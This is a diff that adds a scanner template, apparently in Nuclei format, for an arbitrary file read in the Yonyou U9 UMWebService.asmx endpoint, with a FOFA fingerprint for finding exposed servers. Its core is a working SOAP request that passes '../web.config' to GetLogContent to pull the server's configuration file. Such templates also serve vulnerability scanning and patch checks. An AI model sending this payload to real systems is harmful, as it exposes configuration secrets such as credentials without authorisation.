@@ -1,0 +1,19 @@
+id: poc-qm01g8via0ls7661
+info:
+  name: 用友U9 UMWebService.asmx 任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qm01g8via0ls7661'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qm01g8via0ls7661
+    fofa: body="logo-u9.png"
+http:
+- raw:
+  - "POST /u9/OnLine/UMWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36\nConnection: close\nContent-Type: text/xml; charset=utf-8\nAccept-Encoding: gzip\nContent-Length: 371\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetLogContent xmlns=\"http://tempuri.org/\">\n      <fileName>../web.config</fileName>\n    </GetLogContent>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
